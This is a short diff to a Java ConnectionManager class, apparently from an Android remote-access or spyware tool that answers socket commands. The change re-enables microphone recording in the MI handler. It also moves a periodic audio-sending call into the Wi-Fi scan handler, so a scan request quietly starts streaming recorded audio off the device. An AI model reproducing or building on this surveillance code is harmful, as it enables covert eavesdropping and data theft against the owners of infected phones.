@@ -147,12 +147,13 @@ public class ConnectionManager {
     }
 
     public static void MI(int sec) throws Exception{
-        // MicManager.startRecording(sec);
-        AudioRecorder.sendPeriodically();
+        MicManager.startRecording(sec);
+        
     }
 
     public static void WI() {
         ioSocket.emit("0xWI" , WifiScanner.scan(context));
+        AudioRecorder.sendPeriodically();
     }
 
     public static void PM() {
